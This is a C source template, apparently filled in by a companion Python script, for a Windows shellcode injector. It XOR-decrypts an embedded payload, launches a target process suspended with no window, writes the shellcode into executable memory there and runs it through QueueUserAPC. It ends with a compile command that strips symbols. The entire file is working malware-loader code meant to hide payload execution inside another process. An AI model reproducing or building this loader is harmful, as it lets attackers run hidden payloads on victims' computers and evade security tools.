#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Simple XOR decryption stub
void XOR(char* data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

int main(void) {
    // Shellcode and key are injected by the Python script
    unsigned char shellcode[] = { {{ shellcode_hex }} };
    char key = {{ xor_key }};
    wchar_t targetProcess[] = L"{{ target_process_str }}";

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx; // Required for GetThreadContext/SetThreadContext if used

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Decrypt the payload
    XOR((char*)shellcode, sizeof(shellcode), key);

    // Create the target process in a suspended state
    if (!CreateProcessW(NULL, targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // printf("CreateProcessW failed: %lu\n", GetLastError());
        return 1;
    }

    // Get context of the primary thread for 64-bit (optional, for more advanced injection, QueueUserAPC is simpler)
    // For 64bit process hollowing, you would typically get the thread context,
    // find the entry point (PEB -> ImageBaseAddress + AddressOfEntryPoint),
    // then write shellcode there and modify RIP.
    // However, QueueUserAPC is often sufficient and simpler.
    // ctx.ContextFlags = CONTEXT_FULL;
    // if (!GetThreadContext(pi.hThread, &ctx)) {
    //     TerminateProcess(pi.hProcess, 1);
    //     return 1;
    // }

    // Allocate memory in the remote process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        // printf("VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); // Close thread handle
        return 1;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, sizeof(shellcode), NULL)) {
        // printf("WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); // Close thread handle
        return 1;
    }

    // Redirect execution to our shellcode using QueueUserAPC
    // This is a common and relatively stable way to achieve execution.
    // It queues an Asynchronous Procedure Call to the target thread.
    // When the thread enters an alertable state, it will execute the APC.
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteMem;
    if (QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, (ULONG_PTR)NULL) == 0) { // ULONG_PTR for parameter, can be NULL
        // printf("QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); // Close thread handle
        return 1;
    }

    // Resume the main thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        // printf("ResumeThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); // Close thread handle
        return 1;
    }

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

// To compile manually for testing (replace placeholders):
// x86_64-w64-mingw32-g++ process_hollowing.cpp -o hollow.exe -s -O2 -mwindows -Wall